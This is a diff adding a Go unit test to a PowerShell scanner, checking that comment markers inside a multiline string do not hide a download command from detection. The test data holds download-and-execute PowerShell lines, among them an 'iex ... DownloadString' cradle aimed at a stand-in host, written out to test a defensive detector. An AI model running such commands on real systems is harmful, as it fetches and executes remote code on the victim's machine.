@@ -59,6 +59,19 @@ func TestScanPowerShell_QuotedCommentMarkersAreLiteral(t *testing.T) {
 	}
 }
 
+func TestScanPowerShell_MultilineQuotedCommentMarkersAreLiteral(t *testing.T) {
+	content := []byte("$message = \"line one\n" +
+		"<# still inside string\n" +
+		"line three\"\n" +
+		"Invoke-WebRequest http://evil.example/payload.ps1\n")
+
+	signals := ScanPowerShell(content)
+	categories := powerShellSignalCategories(signals)
+	if !categories["http_download"] {
+		t.Fatalf("expected http_download after multiline quoted <# marker, got %#v", signals)
+	}
+}
+
 func TestScanPowerShell_NestedBlockComments_ResumesAfterClose(t *testing.T) {
 	content := []byte(`<# outer <# nested #> #> iex (New-Object Net.WebClient).DownloadString("http://evil.example/payload.ps1")`)
 
